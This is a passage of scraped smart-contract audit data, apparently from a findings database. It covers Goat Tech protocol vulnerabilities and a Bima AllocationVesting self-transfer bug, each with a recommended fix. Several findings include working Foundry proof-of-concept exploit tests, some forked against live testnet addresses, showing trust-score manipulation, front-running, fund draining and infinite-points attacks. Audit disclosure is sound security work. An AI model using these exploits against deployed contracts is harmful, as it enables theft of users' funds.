Likelihood: It is a very simple attack to execute and any user could easily do this with negligible cost, see
the proof of concept.
21
Proof of concept: The following foundry test test__ReInvesthenWithdrawPoC() illustrates the attack sce-
nario. Run it with the following command line input:
forge test --mt test__ReInvesthenWithdrawPoC -vv
pragma solidity =0.8.8;
import ""forge-std/Test.sol"";
import ""forge-std/console.sol"";
import ""../contracts/Controller.sol"";
import ""../contracts/Profile.sol"";
import ""../contracts/DCT.sol"";
import ""../contracts/PoolFactory.sol"";
import ""../contracts/EthSharing.sol"";
import ""../contracts/lib/LLocker.sol"";
import ""../contracts/interfaces/IPoolFactory.sol"";
import ""../contracts/interfaces/IProfile.sol"";
import ""../contracts/interfaces/IDCT.sol"";
import ""../contracts/interfaces/IVoting.sol"";
import ""../contracts/interfaces/IEthSharing.sol"";
import ""../contracts/modules/UseAccessControl.sol"";
import ""../contracts/modules/Earning.sol"";
import ""../contracts/modules/Locker.sol"";
import ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";
import ""../contracts/modules/DToken.sol"";
contract Fork is Test {
// GoatTech Contracts
Controller controller;
Profile profile;
Locker locker;
UseAccessControl useAccessControl;
Earning earning;
DCT goat;
Locker goatLocker;
DToken Dp2pDToken;
DToken trustScoreToken;
PoolFactory poolFactory;
EthSharing ethSharing;
// Setup users
address Whale = 0xD8Ea779b8FFC1096CA422D40588C4c0641709890;
address Alice = 0x71B61c2E250AFa05dFc36304D6c91501bE0965D8;
address Eve = 0xb2248390842d3C4aCF1D8A893954Afc0EAc586e5;
address John = 0x0F7F6B308B5111EB4a86D44Dc90394b53A3aCe13;
address John2ndAccount = 0x4c968f6bEecf1906710b08e8B472b8Ba6E75F957;
uint256 fork;
function setUp() public {
// Set up forked environment for Arbitrum Sepolia
fork = vm.createFork(""https://public.stackup.sh/api/v1/node/arbitrum-sepolia"");
// These addresses are the live GoatTech Contracts on Arbitrum Sepolia
controller = Controller(payable(address(0xB4E5f0B2885F09Fd5a078D86E94E5D2E4b8530a7)));
profile = Profile(0x7c25C3EDd4576B78b4F8aa1128320AE3d7204bEc);
locker = Locker(0x0265850FE8A0615260a1008e1C1Df01DB394E74a);
useAccessControl = UseAccessControl(0x588CF1494C5aC93796134E5e1827F58D2a8A9cDB);
earning = Earning(0xf7a08a0728C583075852Be8B67E47DceB5c71d48);
goat = DCT(0x5Bfe38c9f309AED44DAa035abf69C80786355136);
goatLocker = Locker(0x1033d5f886aef22fFADebf5f8c34088030Bb80f3);
Dp2pDToken = DToken(0x72835409B8B49d83D8A710e67c906aE313D22860);
trustScoreToken = DToken(0x8B64439A617bB1e85F83b97EA779eDEf49b9DCb2);
poolFactory = PoolFactory(0x8E0cAeE3d94d5497744e2DB30Eec2D222739dF6D);
ethSharing = EthSharing(0xe8330EcE50934EaC7457A712f9079d7775B04c9a);
}
function test__ReInvesthenWithdrawPoC() public {
22
vm.selectFork(fork);
// John creates his own account and stakes a lot of eth
vm.startPrank(John);
controller.ethStake{value: 100 ether}(payable(John), 720 days, 1000, 2000300, 1, 0);
// John sets up his second account ' s pool by staking a small amount into it
vm.startPrank(John2ndAccount);
controller.ethStake{value: 0.002 ether}(payable(John2ndAccount), 30 days, 1000, 2000300, 1, 0);
// John changes the owner% of John2ndAccount to 99%
ethSharing.configPool(9999, 0);
// He gets other users to stake like Alice and Eve
vm.startPrank(Alice);
controller.ethStake{value: 100 ether}(payable(John), 720 days, 1000, 2000300, 1, 0);
vm.startPrank(Eve);
controller.ethStake{value: 100 ether}(payable(John), 720 days, 1000, 2000300, 1, 0);
// check john ' s trust score before withdrawing earnings
IPoolFactory.SPool memory JohnsPoolsBefore = poolFactory.getPool(John);
uint256 johnsTrustScoreBeforeWithdrawingEarnings =
trustScoreToken.balanceOf(JohnsPoolsBefore.dctDistributor); ,→
console.log(""John ' s trust score before withdrawing earnings"", johnsTrustScoreBeforeWithdrawingEarnings ⌋
);
// For the scenario I will clear John2ndAccount ' s current earnings to = 0
vm.startPrank(John2ndAccount);
controller.earningWithdraw(true, earning.earningOf(John2ndAccount), payable(John2ndAccount), 1);
assertTrue(earning.earningOf(John2ndAccount) == 0);
// check john ' s earnings after many poeple invested in his pool
uint256 johnTotalEarnings = earning.earningOf(John);
console.log(""John ' Total Earnings"", johnTotalEarnings);
// His earnings are high and he wants to withdraw
// But if he does his trust score will go down
// Instead he re invests to his setup second account John2ndAccount
vm.startPrank(John);
controller.earningReinvest(true, payable(John2ndAccount), 720 days, johnTotalEarnings, 1000, 99990000);
// check john ' s trust score after re-investing
IPoolFactory.SPool memory JohnsPoolsAfter = poolFactory.getPool(John);
uint256 johnsTrustScoreAfterWithdrawingEarnings =
trustScoreToken.balanceOf(JohnsPoolsAfter.dctDistributor); ,→
console.log(""John ' s trust score after re-investing"", johnsTrustScoreAfterWithdrawingEarnings);
// The trust score is the same !!
assertTrue(johnsTrustScoreBeforeWithdrawingEarnings == johnsTrustScoreAfterWithdrawingEarnings);
// check that the reinvested amount is now in John2ndAccount earnings
// 99% of John ' s earnings will now be in John2ndAccount earnings, 1% goes to the devTeam
console.log(""John ' s reinvested amount"", johnTotalEarnings);
uint256 John2ndAccountEarnings = earning.earningOf(John2ndAccount);
console.log(""John2ndAccount ' s earnings after john reinvested once"", John2ndAccountEarnings);
// Then john immediately withdraws all the earnings from his second account John2ndAccount
vm.startPrank(John2ndAccount);
controller.earningWithdraw(true, earning.earningOf(John2ndAccount), payable(John2ndAccount), 1);
// This shows how John has easily withdrawn earnings without dropping his trust score
// This breaks the core protocol functionality of beign a reputation standard
// The ""Trust Score"" cannot be trusted if it can be manipulated like this by bad actors
}
}
Console Output:
23
forge test --mt test__ReInvesthenWithdrawPoC -vv
[] Compiling...
[] Compiling 2 files with 0.8.8
[] Solc 0.8.8 finished in 3.43s
Compiler run successful!
Ran 1 test for test/PoCReinvesting.t.sol:Fork
[PASS] test__ReInvesthenWithdrawPoC() (gas: 19311988)
Logs:
John ' s trust score before withdrawing earnings 954361232791632965478
John ' Total Earnings 8481190962402927140
John ' s trust score after re-investing 954361232791632965478
John ' s reinvested amount 8481190962402927140
John2ndAccount ' s earnings after john reinvested once 8395582664918298800
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 218.16s (215.41s CPU time)
Ran 1 test suite in 218.16s (218.16s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
Recommendation: Have an upper limit on the Owner% and User% to prevent this attack. I would recom-
mend requiring ( Owner% + User% ) < 50% .
Goat: Fixed
3.1.13 Anyone can steal protocol 's llido assets and ether balance using its distributive functions
Submitted by 0xumarkhatab
Severity: High Risk
Context: (No context ﬁles were provided by the reviewer)
Description: Due to lack of access control on following functions, anyone can call these functions and
steal the LLido reserves (which is converted to ether balance mostly) and smart contract 's Ether balance.
• Controller::claimRevenueShareDevTeam :
function claimRevenueShareDevTeam()
public
{
address account = msg.sender;
earningWithdrawDevTeam();
_devTeam.claimFor(account, address(this));
LLido.allToEth(0);
payable(account).transfer(address(this).balance);
}
• Controller::earningPulls anyone can get all contract balance different account &
bountyPullerTo_ :
function earningPulls(
address account_,
address[] memory poolOwners_,
address bountyPullerTo_
)
public
tryPublicMint
{
_dEarning.clean();
_eEarning.clean();
// _eP2PDistributor.distribute();
_dP2PDistributor.distribute();
// _eDP2PDistributor.distribute();
// _dDP2PDistributor.distribute();
// _eDP2PDistributor.claimFor(account_, address(this));
// _dDP2PDistributor.claimFor(account_, address(_dEarning));
_distributorClaimFor(address(_eDP2PDistributor), account_, address(this));
_distributorClaimFor(address(_dDP2PDistributor), account_, address(_dEarning));
24
for(uint i = 0; i < poolOwners_.length; i++) {
_earningPull(account_, poolOwners_[i]);
}
if (bountyPullerTo_ == account_) {
_geth.transfer(address(_eEarning), _geth.balanceOf(address(this)));
} else {
uint256 amountForPuller = _geth.balanceOf(address(this)) * _bountyPullEarningPercent /
LPercentage.DEMI; ,→
LLido.sellWsteth(amountForPuller);
LLido.wethToEth();
payable(bountyPullerTo_).transfer(address(this).balance);
_geth.transfer(address(_eEarning), _geth.balanceOf(address(this)));
}
_dEarning.update(account_, true);
_eEarning.update(account_, true);
_reCalFs(account_);
}
As these functions does not check the authority of msg.sender , and the internal calls are non-reverting if
observed closely. So no one is keeping anyone calling these functions. When there are certain amount of
reserves in the contract whether in the form of wrapped tokens or Ether balance and transfer all those
assets to them.
Because the funds are being transferred to either directory to msg.sender :
address account = msg.sender;
// ...
// ...
payable(account).transfer(address(this).balance);
or the params that are controlled by msg.sender .
function earningPulls(
address account_,
address[] memory poolOwners_,
address bountyPullerTo_
){
// rest of the code
payable(bountyPullerTo_).transfer(address(this).balance);
// rest of the code
}
Additonally these functions are also subject to MEV so if any legit user is calling these functions, a MEV bot
would pick this transaction from mempool simulate in their environment, and they will see they are gain-
ing Ether. So they would make the same transaction by themselves and change the params accordingly
and submit this transaction with higher gas fees potentially earning the funds.
The legit user 's transaction will fail.
Recommendation: Implement access control on these function and the parameters passed to functions,
e.g. require whether msg.sender & bountyPuller are authorized to call these functions.
Goat: Fixed
25
3.1.14 A malicious user can prevent vote creation at almost no cost
Submitted by b0g0
Severity: High Risk
Context: (No context ﬁles were provided by the reviewer)
Description: A staker in the GOAT protocol can raise a reputation challenge against any other staker.
This happens by creating a vote, where the challenger ( attacker ) and the challenged ( defender ) are the 2
sides. The attacker locks wstETH in the Voting.sol contract proportional to the amount of the defender
earnings he wants to freeze.
Vote creation happens through the Controller.createVote() function:
function createVote(
address defender_,
uint dEthValue_,
uint voterPercent_,
uint freezeDuration_,
uint minWstethA_,
uint wstethA_
)
external
payable
{
require(_isPausedAttack == 0, ""paused"");
address attacker = msg.sender;
// _weth.deposit{value: address(this).balance}();
_prepareWsteth(minWstethA_, wstethA_);
uint aEthValue = _geth.balanceOf(address(this));
require(defender_ != address(_devTeam));
require(dEthValue_ >= _minDefenderFund, ""dEthValue_ too small"");
require(voterPercent_ <= _maxVoterPercent, ""voterPercent_ too high"");
require(freezeDuration_ >= _minFreezeDuration && freezeDuration_ <= _maxFreezeDuration, ""freezeDuration_
invalid""); ,→
require(aEthValue <= dEthValue_ && aEthValue * LPercentage.DEMI / dEthValue_ >= _minAttackerFundRate,
""aEthValue invalid""); ,→
// ...
}
The following check is the one we should focus on, since it will be the one exploited:
require(aEthValue <= dEthValue_ && aEthValue * LPercentage.DEMI / dEthValue_ >= _minAttackerFundRate,
""aEthValue invalid""); ,→
It basically makes sure that the amount locked by the attacker is <=than the amount frozen on the
defender . And the attacker amount is calculated based on the balances like so:
uint aEthValue = _geth.balanceOf(address(this));
This makes it quite easy for an interested party to front-run the createVote() trx and transfer enough
wstETH to the Controller contract , so that aEthValue > dEthValue_ , which will revert it.
What makes this exploit even less costly for the malicious actor is that he can sandwich createVote() with
another transaction right after it and withdrawal the wstETH he transferred in the ﬁrst transaction.
He can do this by calling Controller.earningWithdraw() , which unwraps the wstETH balances sitting in
Controller and sends them to the caller:
•Controller.sol#L617
26
function earningWithdraw(
bool isEth_,
uint amount_,
address payable dest_,
uint minEthA_
// address[] memory pulledPoolOwners_
)
public
{
.....
if (isEth_) {
....
if (dest_ != address(this)) {
LLido.allToEth(minEthA_); // <-- unwraps wstETH.balanceOf(address(this)) and sends it
dest_.transfer(address(this).balance);
}
// ...
}
As a result the cost of the attack for the exploiter is reduced only to the gas fees for the 2 transactions,
which is nothing.
Proof of concept: Since the protocol has no tests, I created a Foundry Project and wrote fork tests using
the contracts deployed on Arbitrum Sepolia. The used Sepolia RPC provider is a demo one (I actually used
Alchemy).
import ""forge-std/Test.sol"";
import {IERC20} from ""openzeppelin-contracts/contracts/interfaces/IERC20.sol"";
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;
interface IController {
function ethStake(
address payable poolOwner_,
uint duration_,
uint minSPercent_,
uint poolConfigCode_,
uint minWstethA_,
uint wstethA_
) external payable;
function dctStake(
uint amount_,
address payable poolOwner_,
uint duration_
) external payable;
function earningPulls(
address account_,
address[] memory poolOwners_,
address bountyPullerTo_
) external;
function lockWithdraw(
bool isEth_,
address payable poolOwner_,
uint amount_,
address payable dest_,
bool isForced_,
uint minEthA_
) external;
function earningReinvest(
bool isEth_,
address payable poolOwner_,
uint duration_,
uint amount_,
uint minSPercent_,
uint poolConfigCode_
) external;
function earningWithdraw(
bool isEth_,
27
uint amount_,
address payable dest_,
uint minEthA_
) external;
function createVote(
address defender_,
uint dEthValue_,
uint voterPercent_,
uint freezeDuration_,
uint minWstethA_,
uint wstethA_
) external payable;
function votingClaimFor(uint voteId_, address voter_) external;
function earningWithdrawDevTeam() external;
function claimRevenueShareDevTeam() external;
function updateConfigs(uint[] memory values_) external;
}
interface IAccessControll {
function approveAdmin(address admin_) external;
}
interface IVoting {
struct SVoteBasicInfo {
address attacker;
address defender;
uint aEthValue;
uint dEthValue;
uint voterPercent;
uint aQuorum;
uint startedAt;
uint endAt;
uint attackerPower;
uint defenderPower;
uint totalClaimed;
bool isFinalized;
bool isAttackerWon;
uint winVal;
uint winnerPower;
bool isClosed;
}
function createVote(
address attacker_,
address defender_,
uint aEthValue_,
uint dEthValue_,
uint voterPercent_,
uint aQuorum_,
uint startedAt_,
uint endAt_
) external;
function getVote(
uint voteId_
) external view returns (SVoteBasicInfo memory);
function claimFor(uint voteId_, address voter_) external;
function defenderEarningFreezedOf(
address account_
) external view returns (uint);
}
interface IEarning {
function initEarning(
address token_,
address profileCAddr_,
address accessControl_,
string memory name_,
string memory symbol_
28
) external;
function updateMaxEarning(address account_, uint maxEarning_) external;
function shareCommission(address account_) external;
function update(address account_, bool needShareComm_) external;
function withdraw(address account_, uint amount_, address dest_) external;
function earningOf(address account_) external view returns (uint);
function maxEarningOf(address account_) external view returns (uint);
}
contract TestContract is Test {
uint256 chainFork;
//contracts
IController controller =
IController(0xB4E5f0B2885F09Fd5a078D86E94E5D2E4b8530a7);
IAccessControll dst_locker =
IAccessControll(0x1033d5f886aef22fFADebf5f8c34088030Bb80f3);
IVoting voting = IVoting(0x896604b21C6e9CbCE82e096266DCb5798cDDA67B);
IEarning eEarning = IEarning(0xf7a08a0728C583075852Be8B67E47DceB5c71d48);
//tokens
IERC20 dP2PDToken = IERC20(0x72835409B8B49d83D8A710e67c906aE313D22860);
IERC20 GOAT = IERC20(0x5Bfe38c9f309AED44DAa035abf69C80786355136);
IERC20 WSTETH = IERC20(0x89840d36C96067DE8bd311d73802e3BC80877c2F);
function setUp() public {
// this is a free RPC endpoint, change it if not working
chainFork = vm.createFork(""https://sepolia-rollup.arbitrum.io/rpc"");
}
function test_front_run_vote(uint256 amount) public {
vm.selectFork(chainFork);
address alice = address(100);
address bob = address(150);
deal(address(GOAT), alice, 100 ether);
deal(address(GOAT), bob, 100 ether);
// add 10 wstEth earnings for Bob
deal(address(WSTETH), address(eEarning), 10806344879586039781);
eEarning.update(bob, false);
assertEq(eEarning.earningOf(bob), 10 ether);
//add some wstEth balances to Bob & Alice
deal(address(WSTETH), alice, 10 ether);
deal(address(WSTETH), bob, 10 ether);
vm.startPrank(alice);
GOAT.approve(address(controller), 100 ether);
WSTETH.approve(address(controller), 10 ether);
vm.stopPrank();
// create a snapshot of the state before the reputation challenge
uint256 snapshot = vm.snapshot();
// CASE-1 -> Alice Reputation Challenge Succeeds
// Alice Opens Reputation Challenge against Bob
vm.prank(alice);
controller.createVote(bob, 8 ether, 1_000, 5 days, 0, 5 ether);
// Alice has locked 5 ether
assertEq(WSTETH.balanceOf(alice), 5 ether);
// 8 ether of Bob earnings were locked
assertEq(voting.defenderEarningFreezedOf(bob), 8 ether);
// go back to snapshot and and reset state
vm.revertTo(snapshot);
29
// CASE-2 -> Bob front-runs Alice and reverts Reputation Challenge
// state is reset
assertEq(voting.defenderEarningFreezedOf(bob), 0);
assertEq(WSTETH.balanceOf(alice), 10 ether);
assertEq(eEarning.earningOf(bob), 10 ether);
// Bob send enough wstETH to Controller and triggers validation failure
vm.prank(bob);
WSTETH.transfer(address(controller), 3 ether + 1 wei);
// Alice Fails to create Reputation Challenge against Bob
vm.prank(alice);
vm.expectRevert(""aEthValue invalid"");
controller.createVote(bob, 8 ether, 1_000, 5 days, 0, 5 ether);
// Bob takes back his ETH
vm.prank(bob);
assertEq(bob.balance, 0);
controller.earningWithdraw(true, 0, payable(bob), 0);
// Bob gets unwrapped wstETH
assertGe(bob.balance, 3 ether + 1 wei);
// Bob has the other wstETH
assertEq(WSTETH.balanceOf(bob), 10 ether - 3 ether - 1 wei);
}
}
Recommendation: * Make aEthValue a parameter that is passed by the user and use it in the exploited
check:
function createVote(
address defender_,
uint dEthValue_,
uint aEthValue, // <----- provided by user
uint voterPercent_,
uint freezeDuration_,
uint minWstethA_,
uint wstethA_
) external payable {
// ...
// this cannot be influenced by direct transfers
require(aEthValue <= dEthValue_ && aEthValue * LPercentage.DEMI / dEthValue_ >= _minAttackerFundRate,
""aEthValue invalid""); ,→
}
The transferFrom will fail in case the user did not provided the appropriate amount.
Goat: will ﬁx
3.1.15 The swapexactinputsinglehop function in the llido library consistently fails
Submitted by merlin, also found by 0xrex, zigtur, deth, hals, Rotciv Egaf, 0xRizwan, Spearmint, ast3ros,
smbv19192323, 0xblackskull, Said and 0xluckyy
Severity: High Risk
Context: (No context ﬁles were provided by the reviewer)
Description: The functions LLido.allToWsteth , LLido.sellWsteth() , and LLido.allToEth() are utilized
in various parts of the Controller smart contract during the execution of ethStake, earningPulls, lock-
Withdraw, earningWithdraw , and other functions. These functions, in turn, invoke swapExactInputSin-
gleHop() :
30
library LLido
function swapExactInputSingleHop(
address tokenIn,
address tokenOut,
uint amountIn
)
internal
returns (uint amountOut) {
ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
.ExactInputSingleParams({
tokenIn: tokenIn,
tokenOut: tokenOut,
fee: POOL_FEE,
recipient: address(this),
// deadline: block.timestamp,
amountIn: amountIn,
amountOutMinimum: 0,
sqrtPriceLimitX96: 0
});
amountOut = router.exactInputSingle(params);
}
The value of deadline is commented out, but the router , where the exactInputSingle function is called,
checks this value:
modifier checkDeadline(uint256 deadline) {
require(_blockTimestamp() <= deadline, ' Transaction too old ' );
_;
}
As a result, the protocol will not function properly, and essential functions will fail with the reason Trans-
action too old .
Recommendation: Consider passing the deadline value for the successful execution of the function:
function swapExactInputSingleHop(
address tokenIn,
address tokenOut,
uint amountIn,
+ uint deadline_
)
internal
returns (uint amountOut) {
ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
.ExactInputSingleParams({
tokenIn: tokenIn,
tokenOut: tokenOut,
fee: POOL_FEE,
recipient: address(this),
- // deadline: block.timestamp,
+ deadline: deadline_,
amountIn: amountIn,
amountOutMinimum: 0,
sqrtPriceLimitX96: 0
});
amountOut = router.exactInputSingle(params);
}
Goat ""we use SwapRouter02 abi, they don 't have deadline param on struct ExactInputSingleParams.
struct ExactInputSingleParams {
address tokenIn;
address tokenOut;
uint24 fee;
address recipient;
uint256 amountIn;
uint256 amountOutMinimum;
uint160 sqrtPriceLimitX96;
}
31
https://sepolia.arbiscan.io/address/0x101F443B4d1b059569D643917553c771E1b9663E#code%22
Judge: Acknowledged. However in the current codebase the library has a hardcoded router address
0xE592427A0AEce92De3Edee1F18E0157C05861564 which is has deadline
3.1.16 During voting the attacker 's refund is vulnerable to a sandwich attack
Submitted by Spearmint, also found by PENGUN, 0xRajkumar, Bauer, zigtur, hals, Bauchibred and Tripathi
Severity: High Risk
Context: (No context ﬁles were provided by the reviewer)
Description: The _tryFinalize in Voting.sol is vulnerable to sandwhich attacks. The root cause of the
vulnerability is not implementing any slippage checks on the uniswap tx when selling wsteth to refund
the attacker
// refund to attacker
LLido.sellWsteth(toWinnerVal);
LLido.wethToEth();
to.send(address(this).balance);
Proof of concept: Consider the following attack scenario:
1. Malicious user Identiﬁes a vote where the attacker has passed the quorum but the vote has not
ended yet, therefore has not yet been ﬁnalized.
2. The malicious user waits for the second the vote ends, then sends a transaction where he uses a
ﬂash loan to swap wsteth for weth, inﬂating the price of weth.
3. Within the same transaction, they immediately call votingClaimFor:: Controller.sol which calls
_tryFinalize::Voting.sol .
4. Since the Attacker won, the _tryFinalize function will try to refund the attacker as follows:
uint toWinnerVal = vote.aEthValue + vote.dEthValue - vote.winVal;
address payable to = payable(vote.attacker);
// refund to attacker
LLido.sellWsteth(toWinnerVal);
LLido.wethToEth();
to.send(address(this).balance);
The refund swap goes through at the undesirable inﬂated price so they get a lot less weth for their wsteth.
5 The malicious user can then swap the weth they got earlier for wsteth at a signiﬁcant proﬁt stealing
from the user who is the attacker in the vote.
Recommendation: Implement a slippage check
3.1.17 Premature unlocking of goat tokens upon transfer of lock
Submitted by Vijay, also found by etherhood and Haxatron
Severity: High Risk
Context: Vester.sol#L52-L71
Description: In the Vester.sol contract, the admin has the capability to transfer an investor 's lock to
another account via the transferLock function. However, during this transfer, the startedAt timestamp
is not being updated. Due to this Goat tokens of the investor will be unlocked right away irrespective of
the vesting schedule.
As startedAt isn't set in transferLock function , startedAt value for toaccount will stay zero even after
calling transferLock function. Due to this pastTime in the below function will always be calculated to
block.timestamp in the below function.
32
function restDuration(
SLock memory lockData_
)
internal
view
returns(uint)
{
if (lockData_.startedAt > block.timestamp) {
return lockData_.duration + lockData_.startedAt - block.timestamp;
}
uint pastTime = block.timestamp - lockData_.startedAt;
if (pastTime < lockData_.duration) {
return lockData_.duration - pastTime;
} else {
return 0;
}
}
As duration will be way lesser than block.timestamp , rest duration will always be returned as zero and
entire amount of Goat tokens of the investor will be unlocked when Unlock function is called.
Recommendation: Update the lockData.startedAt value for toaccount in transferLock funciton.
Goat: ﬁxed lockData = lockData[to]; lockData.startedAt = block.timestamp;
3.2 Medium Risk",Goat Tech,0xRajkumar,HIGH,,,14,0,0,,https://cdn.cantina.xyz/reports/cantina_competition_goat_mar2024.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/cantina/cantina_competition_goat_mar2024.pdf,https://cantina.xyz/portfolio/404911dd-3a50-4b63-90d4-e0b9164a34a5,solodit_reports,,2024-10-04 01:42:35,2024-10-15 01:43:13,1,,
1867554,cae6429bd8214932634f3c069b3173b2,`AllocationVesting` contract can be exploited for infinite points via self-transfer,Cyfrin,2024-09-27,"**Description:** The `AllocationVesting` contract gives points on vesting schedules to team members, investors, influencers and anyone else entitled to a token allocation.

`AllocationVesting::transferPoints` allows users to transfer points however this function does not correctly [handle](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/AllocationVesting.sol#L129-L133) self-transfer meaning users can exploit it by transferring points to themselves, giving themselves infinite points:
```solidity
// update storage - deduct points from `from` using memory cache
allocations[from].points = uint24(fromAllocation.points - points);

// we don't use fromAllocation as it's been modified with _claim()
allocations[from].claimed = allocations[from].claimed - claimedAdjustment;

// @audit doesn't correctly handle self-transfer since the memory
// cache of `toAllocation.points` will still contain the original
// value of `fromAllocation.points`, so this can be exploited by
// self-transfer to get infinite points
//
// update storage - add points to `to` using memory cache
allocations[to].points = toAllocation.points + uint24(points);
```

**Impact:** Anyone entitled to an allocation can give themselves infinite points and hence receive more tokens than they should receive.

**Proof of Concept:** Add the following PoC contract to `test/foundry/dao/AllocationInvestingTest.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {TestSetup, IBabelVault, ITokenLocker} from ""../TestSetup.sol"";
import {AllocationVesting} from ""./../../../contracts/dao/AllocationVesting.sol"";

import {IERC20} from ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";

contract AllocationVestingTest is TestSetup {
    AllocationVesting internal allocationVesting;

    uint256 internal constant totalAllocation = 100_000_000e18;
    uint256 internal constant maxTotalPreclaimPct = 10;

    function setUp() public virtual override {
        super.setUp();

        allocationVesting = new AllocationVesting(IERC20(address(babelToken)),
                                                  tokenLocker,
                                                  totalAllocation,
                                                  address(babelVault),
                                                  maxTotalPreclaimPct);
    }

    function test_InfinitePointsExploit() external {
        AllocationVesting.AllocationSplit[] memory allocationSplits
            = new AllocationVesting.AllocationSplit[](2);

        uint24 INIT_POINTS = 50000;

        // allocate to 2 users 50% 50%
        allocationSplits[0].recipient = users.user1;
        allocationSplits[0].points = INIT_POINTS;
        allocationSplits[0].numberOfWeeks = 4;

        allocationSplits[1].recipient = users.user2;
        allocationSplits[1].points = INIT_POINTS;
        allocationSplits[1].numberOfWeeks = 4;

        // setup allocations
        uint256 vestingStart = block.timestamp + 1 weeks;
        allocationVesting.setAllocations(allocationSplits, vestingStart);

        // warp to start time
        vm.warp(vestingStart + 1);

        // attacker transfers their total initial point balance to themselves
        vm.prank(users.user1);
        allocationVesting.transferPoints(users.user1, users.user1, INIT_POINTS);

        // attacker then has double the points
        (uint24 points, , , ) = allocationVesting.allocations(users.user1);
        assertEq(points, INIT_POINTS*2);

        // does it again transferring the new larger value
        vm.prank(users.user1);
        allocationVesting.transferPoints(users.user1, users.user1, points);

        // has double again (4x from the initial points)
        (points, , , ) = allocationVesting.allocations(users.user1);
        assertEq(points, INIT_POINTS*4);

        // can go on forever to get infinite points
    }
}
```

Comment out the token transfer inside `AllocationVesting::_claim` since the setup is very basic:
```solidity
        // @audit commented out for PoC
        //vestingToken.transferFrom(vault, msg.sender, claimable);
```

Run with: `forge test --match-test test_InfinitePointsExploit`

**Recommended Mitigation:** Prevent self-transfer in `AllocationVesting::transferPoints`:
```diff
+   error SelfTransfer();

    function transferPoints(address from, address to, uint256 points) external callerOrDelegated(from) {
+       if(from == to) revert SelfTransfer();
```

**Bima:**
Fixed in commit [ce0f8ce](https://github.com/Bima-Labs/bima-v1-core/commit/ce0f8cea6b38b886376f9d543ae2bb9c3b600de9).

**Cyfrin:** Verified.",Bima,Dacian,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-09-27-cyfrin-bima-v2.0.md,,,solodit_reports,,2024-10-04 02:17:27,2024-10-15 02:19:32,1,"allocations[from].points = uint24(fromAllocation.points - points);
        // we don't use fromAllocation as it's been modified with _claim()
        allocations[from].claimed = allocations[from].claimed - claimedAdjustment;

        allocations[to].points = toAllocation.points + uint24(points);",
